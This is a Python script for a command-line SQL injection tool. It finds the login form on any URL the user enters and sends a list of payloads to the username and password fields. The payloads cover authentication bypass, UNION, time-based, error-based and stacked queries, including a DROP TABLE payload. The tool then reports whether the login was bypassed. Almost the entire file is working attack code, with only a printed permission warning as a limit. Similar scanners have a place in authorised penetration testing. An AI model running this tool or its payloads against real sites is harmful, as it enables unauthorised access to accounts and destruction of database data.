import requests
import urllib.parse
from bs4 import BeautifulSoup
import re
import time
from urllib.parse import urljoin

class SQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def get_login_form(self, url):
        """Extract login form details from the webpage"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Find login form (look for password fields)
            password_field = soup.find('input', {'type': 'password'})
            if not password_field:
                return None
                
            form = password_field.find_parent('form')
            if not form:
                return None
                
            # Get form action URL
            action = form.get('action', '')
            if not action.startswith('http'):
                action = urljoin(url, action)
                
            # Get form method
            method = form.get('method', 'get').lower()
            
            # Get all input fields
            inputs = {}
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')
                if name:
                    inputs[name] = {
                        'type': input_type,
                        'value': input_tag.get('value', '')
                    }
                    
            return {
                'action': action,
                'method': method,
                'inputs': inputs
            }
            
        except Exception as e:
            print(f"Error extracting form: {e}")
            return None
    
    def test_injection(self, url, form_data):
        """Test various SQL injection payloads"""
        
        # SQL injection payloads
        payloads = [
            # Classic SQLi
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "admin' --",
            "admin' /*",
            "' OR 1=1 --",
            "' OR 1=1 /*",
            "1' OR '1'='1",
            
            # Union based
            "' UNION SELECT NULL, NULL, NULL --",
            "' UNION SELECT 1,2,3 --",
            "1' UNION SELECT 1,2,3 --",
            
            # Time-based
            "'; WAITFOR DELAY '00:00:05' --",
            "'; SELECT SLEEP(5) --",
            "1'; SELECT pg_sleep(5) --",
            
            # Boolean-based
            "' AND '1'='1",
            "' AND '1'='2",
            "1' AND 1=1",
            "1' AND 1=2",
            
            # Error-based
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --",
            
            # Stacked queries
            "'; DROP TABLE test --",
            "'; INSERT INTO test VALUES('hack') --",
        ]
        
        # Find username and password fields
        username_field = None
        password_field = None
        
        for field_name, field_info in form_data['inputs'].items():
            if field_info['type'] == 'email' or 'user' in field_name.lower() or 'login' in field_name.lower():
                username_field = field_name
            elif field_info['type'] == 'password':
                password_field = field_name
                
        if not username_field or not password_field:
            print("Could not identify username/password fields")
            return False
            
        print(f"Testing injection on fields: {username_field}, {password_field}")
        print("Testing payloads...")
        
        for payload in payloads:
            print(f"Testing: {payload[:50]}...")
            
            # Prepare data with payload
            test_data = {}
            for field_name, field_info in form_data['inputs'].items():
                if field_name == username_field:
                    test_data[field_name] = payload
                elif field_name == password_field:
                    test_data[field_name] = payload
                else:
                    test_data[field_name] = field_info['value']
                    
            try:
                # Make request
                start_time = time.time()
                
                if form_data['method'] == 'post':
                    response = self.session.post(form_data['action'], data=test_data, timeout=10)
                else:
                    response = self.session.get(form_data['action'], params=test_data, timeout=10)
                    
                end_time = time.time()
                response_time = end_time - start_time
                
                # Check for success indicators
                success_indicators = [
                    'welcome', 'dashboard', 'admin', 'success', 'logged in',
                    'logout', 'profile', 'settings', 'home', 'index',
                    'main', 'panel', 'control', 'management'
                ]
                
                # Check response content
                response_text = response.text.lower()
                
                # Check for SQL errors (indicates vulnerability)
                sql_errors = [
                    'sql syntax', 'mysql_fetch', 'ora-', 'microsoft ole db',
                    'odbc drivers error', 'warning: mysql', 'valid mysql result',
                    'mysqlclient', 'postgresql query failed', 'pg_query',
                    'warning: pg_query', 'valid postgresql result', 'nimbus'
                ]
                
                # Check for time-based injection
                if response_time > 4:
                    print(f"✓ TIME-BASED SQLi DETECTED with payload: {payload}")
                    print(f"Response time: {response_time:.2f} seconds")
                    return True
                    
                # Check for SQL errors
                for error in sql_errors:
                    if error in response_text:
                        print(f"✓ ERROR-BASED SQLi DETECTED with payload: {payload}")
                        print(f"SQL Error found: {error}")
                        return True
                        
                # Check for successful login indicators
                for indicator in success_indicators:
                    if indicator in response_text and 'error' not in response_text:
                        print(f"✓ SUCCESSFUL SQLi with payload: {payload}")
                        print(f"Login successful - found indicator: {indicator}")
                        return True
                        
                # Check if we bypassed login (no error messages, different content length)
                if len(response.text) > 1000 and 'error' not in response_text and 'invalid' not in response_text:
                    print(f"✓ POTENTIAL SQLi with payload: {payload}")
                    print("Response suggests possible successful injection")
                    return True
                    
            except requests.exceptions.Timeout:
                print(f"✓ TIME-BASED SQLi DETECTED (timeout) with payload: {payload}")
                return True
            except Exception as e:
                print(f"Error with payload {payload}: {e}")
                continue
                
        print("No SQL injection vulnerabilities found with tested payloads")
        return False
    
    def run_interface(self):
        """Run the user interface"""
        print("=" * 60)
        print("SQL INJECTION TESTING TOOL")
        print("=" * 60)
        print("WARNING: Only use on systems you have permission to test!")
        print("=" * 60)
        
        while True:
            url = input("\nEnter target website URL (or 'quit' to exit): ").strip()
            
            if url.lower() == 'quit':
                break
                
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
                
            print(f"\n[*] Analyzing: {url}")
            
            # Get login form
            form_data = self.get_login_form(url)
            
            if not form_data:
                print("[-] No login form found on the page")
                continue
                
            print(f"[+] Found login form:")
            print(f"    Action: {form_data['action']}")
            print(f"    Method: {form_data['method']}")
            print(f"    Fields: {list(form_data['inputs'].keys())}")
            
            # Test injection
            print("\n[*] Starting SQL injection tests...")
            success = self.test_injection(url, form_data)
            
            if success:
                print("\n[+] VULNERABILITY FOUND! SQL injection successful.")
                print("[*] Attack completed successfully.")
                break
            else:
                print("\n[-] No vulnerabilities detected.")
                choice = input("Try another URL? (y/n): ").lower()
                if choice != 'y':
                    break
                    
        print("\n[*] Testing completed.")

if __name__ == "__main__":
    try:
        injector = SQLInjector()
        injector.run_interface()
    except KeyboardInterrupt:
        print("\n[*] Testing interrupted by user.")
    except Exception as e:
        print(f"\n[!] Error: {e}")
